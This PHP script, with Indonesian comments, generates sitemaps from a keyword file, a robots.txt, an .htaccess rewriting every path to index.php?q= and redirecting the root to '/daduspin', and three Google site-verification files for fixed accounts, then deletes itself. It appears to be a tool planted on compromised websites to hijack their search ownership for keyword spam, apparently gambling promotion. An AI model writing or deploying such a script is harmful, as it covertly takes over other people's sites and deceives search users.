<?php
ini_set('memory_limit', '20G');

// Function to get the current URL path with customizable protocol
function getCurrentUrlPath($protocol = 'https') {
    $host = $_SERVER['HTTP_HOST'];
    $path = rtrim(dirname($_SERVER['REQUEST_URI']), '/'); // Ensure no trailing slash
    if ($path == "." || $path == "/") {
        $path = "";
    }
    return "$protocol://$host$path/";
}

// Set protocol (http or https)
$protocol = 'https'; // Ganti ke 'http' jika perlu

$judulFile = "kw.txt";
$maxUrlsPerSitemap = 9980;

// Cek apakah file kw.txt tersedia dan bisa dibaca
if (!file_exists($judulFile) || !is_readable($judulFile)) {
    die("File not found or not readable.");
}

// Baca semua baris dari file
$fileLines = file($judulFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$totalKeywords = count($fileLines);

// Dapatkan path URL base
$urlPath = getCurrentUrlPath($protocol);

// Buat file sitemap index
$sitemapIndexFile = fopen("sitemap_index.xml", "w");
if (!$sitemapIndexFile) {
    die("Unable to open sitemap_index.xml for writing.");
}

// Tulis header XML untuk sitemap index
fwrite($sitemapIndexFile, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
fwrite($sitemapIndexFile, '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);

$currentSitemapNum = 1;
$currentSitemapUrls = 0;
$sitemapFile = null;

function openNewSitemapFile($num) {
    $sitemapFileName = "sitemap{$num}.xml";
    $file = fopen($sitemapFileName, "w");
    if (!$file) {
        die("Unable to open $sitemapFileName for writing.");
    }
    fwrite($file, '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL);
    fwrite($file, '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL);
    return $file;
}

function closeSitemapFile($file) {
    fwrite($file, '</urlset>' . PHP_EOL);
    fclose($file);
}

function writeSitemapIndexEntry($indexFile, $urlPath, $num) {
    fwrite($indexFile, '  <sitemap>' . PHP_EOL);
    fwrite($indexFile, '    <loc>' . htmlspecialchars($urlPath . "sitemap{$num}.xml") . '</loc>' . PHP_EOL);
    fwrite($indexFile, '    <lastmod>' . date('Y-m-d\TH:i:sP') . '</lastmod>' . PHP_EOL);
    fwrite($indexFile, '  </sitemap>' . PHP_EOL);
}

$sitemapFile = openNewSitemapFile($currentSitemapNum);

// Siapkan semua URL dari keywords
$allUrls = [];
foreach ($fileLines as $judul) {
    $baseTargetString = strtolower(str_replace(' ', '-', $judul));
    $baseTargetString = preg_replace('/[^a-z0-9\-]/', '', $baseTargetString); // Hanya karakter valid
    $allUrls[] = [
        'keyword' => $baseTargetString,
        'url' => $baseTargetString
    ];
}

// Acak urutan URL (opsional)
shuffle($allUrls);

// Tulis ke file sitemap
foreach ($allUrls as $urlData) {
    if ($currentSitemapUrls >= $maxUrlsPerSitemap) {
        closeSitemapFile($sitemapFile);
        writeSitemapIndexEntry($sitemapIndexFile, $urlPath, $currentSitemapNum);
        $currentSitemapNum++;
        $sitemapFile = openNewSitemapFile($currentSitemapNum);
        $currentSitemapUrls = 0;
    }

    $htmlURL = $urlPath . $urlData['url'];

    fwrite($sitemapFile, '  <url>' . PHP_EOL);
    fwrite($sitemapFile, '    <loc>' . htmlspecialchars($htmlURL) . '</loc>' . PHP_EOL);
    fwrite($sitemapFile, '    <lastmod>' . date('Y-m-d\TH:i:sP') . '</lastmod>' . PHP_EOL);
    fwrite($sitemapFile, '    <changefreq>daily</changefreq>' . PHP_EOL);
    fwrite($sitemapFile, '  </url>' . PHP_EOL);

    $currentSitemapUrls++;
}

if ($currentSitemapUrls > 0) {
    closeSitemapFile($sitemapFile);
    writeSitemapIndexEntry($sitemapIndexFile, $urlPath, $currentSitemapNum);
}

fwrite($sitemapIndexFile, '</sitemapindex>' . PHP_EOL);
fclose($sitemapIndexFile);

// ==============================
// Buat file robots.txt
// ==============================
$robotsFile = fopen("robots.txt", "w");
if (!$robotsFile) {
    die("Unable to open robots.txt for writing.");
}

fwrite($robotsFile, "User-agent: *\n");
fwrite($robotsFile, "Allow: /\n\n");
fwrite($robotsFile, "Sitemap: " . $urlPath . "sitemap_index.xml\n");

for ($i = 1; $i <= $currentSitemapNum; $i++) {
    fwrite($robotsFile, "Sitemap: " . $urlPath . "sitemap{$i}.xml\n");
}
fclose($robotsFile);

// ==============================
// Buat file verifikasi Google
// ==============================
$verificationFiles = [
    "google48630546e5046131.html" => "google-site-verification: google48630546e5046131.html",
    "googledf0abbb6dcca31d0.html" => "google-site-verification: googledf0abbb6dcca31d0.html",
    "googlef99012a2fb72be2b.html" => "google-site-verification: googlef99012a2fb72be2b.html"
];

foreach ($verificationFiles as $filename => $content) {
    $verificationFile = fopen($filename, "w");
    if (!$verificationFile) {
        die("Unable to create Google Site Verification file: $filename");
    }
    fwrite($verificationFile, $content);
    fclose($verificationFile);
}

// ==============================
// Buat file .htaccess
// ==============================
$htaccessContent = <<<HTACCESS
# Aktifkan mod_rewrite
RewriteEngine On
RewriteBase /service

# === 0. Redirect root folder ke /daduspin
RewriteRule ^$ daduspin [R=301,L]

# === 1. Biarkan file .txt, .xml, .php, dan robots.txt diakses langsung
RewriteCond %{REQUEST_URI} \.(txt|xml|php)$ [NC,OR]
RewriteCond %{REQUEST_URI} robots\.txt$ [NC]
RewriteRule .* - [L]

# === 2. Clean URL: /banana → index.php?q=banana
RewriteRule ^([^/]+)/?$ index.php?q=$1 [L,QSA]

# === 3. Redirect query string: /?q=banana → /banana
RewriteCond %{QUERY_STRING} ^q=([^&]+)$
RewriteRule ^$ %1? [R=301,L]
HTACCESS;

$htaccessFile = fopen(".htaccess", "w");
if (!$htaccessFile) {
    die("Unable to create .htaccess file.");
}
fwrite($htaccessFile, $htaccessContent);
fclose($htaccessFile);

echo "SITEMAPS, ROBOTS.TXT, GOOGLE VERIFICATION, .HTACCESS CREATED SUCCESSFULLY!";

// ==============================
// Hapus file ini (oke1.php)
// ==============================
$scriptName = basename(__FILE__);
if (file_exists($scriptName)) {
    unlink($scriptName);
}
?>
